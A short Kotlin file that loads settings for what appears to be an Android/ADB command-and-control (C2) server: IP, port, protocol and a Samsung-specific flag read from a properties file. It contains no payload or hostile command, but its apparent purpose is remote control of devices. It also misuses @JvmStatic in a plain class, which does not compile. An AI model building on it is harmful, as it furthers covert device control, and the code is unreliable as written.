package Src.ADB

import java.io.FileInputStream
import java.io.IOException
import java.util.Properties
import Src.Utils.Logger

data class C2Config(
    val serverIp: String = "",
    val serverPort: Int = 8888,
    val communicationProtocol: String = "http", // or "tcp"
    val samsungOptimization: Boolean = false // New field for Samsung optimization
)

class C2ConfigLoader(private val logger: Logger = Logger()) {
    @JvmStatic
    fun loadConfig(filePath: String = "C2_config.properties"): C2Config {
        val properties = Properties()
        val config = C2Config()
        try {
            FileInputStream(filePath).use { properties.load(it) }
            return C2Config(
                serverIp = properties.getProperty("c2_server_ip", config.serverIp),
                serverPort = properties.getProperty("c2_server_port", config.serverPort.toString()).toIntOrNull() ?: config.serverPort,
                communicationProtocol = properties.getProperty("communication_protocol", config.communicationProtocol),
                samsungOptimization = properties.getProperty("samsung_optimization", config.samsungOptimization.toString()).toBoolean() // Load the new field
            )
        } catch (e: IOException) {
            logger.warning("Error loading C2 configuration from $filePath: ${e.message}. Using default settings.")
            return config
        }
    }
}
